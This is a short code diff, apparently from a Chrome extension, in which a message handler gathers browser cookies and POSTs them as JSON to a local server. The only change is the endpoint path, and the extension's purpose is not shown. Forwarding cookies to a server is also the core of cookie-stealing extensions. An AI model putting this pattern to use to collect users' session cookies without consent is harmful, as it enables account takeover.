@@ -23,7 +23,7 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
           path: c.path,
         }));
 
-        return fetch("http://localhost:3000/data", {
+        return fetch("http://localhost:3000/api/user/data", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ cookies: payload }),
